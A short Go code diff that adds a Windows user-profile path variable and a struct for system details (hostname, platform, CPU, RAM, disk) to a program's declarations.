@@ -26,12 +26,21 @@ const (
 var (
 	USER string = GetUsername()
 
-	LOCAL   string = os.Getenv("LOCALAPPDATA")
-	ROAMING string = os.Getenv("APPDATA")
-	TEMP    string = os.Getenv("TEMP")
+	LOCAL    string = os.Getenv("LOCALAPPDATA")
+	ROAMING  string = os.Getenv("APPDATA")
+	TEMP     string = os.Getenv("TEMP")
+	PERSONAL string = os.Getenv("USERPROFILE")
 
 	HEADERS [999]string
 )
+
+type SysInfo struct {
+	Hostname string
+	Platform string
+	CPU      string
+	RAM      uint64
+	Disk     uint64
+}
 
 func CleanUp() {
 	_ = os.RemoveAll(TempFileDir)
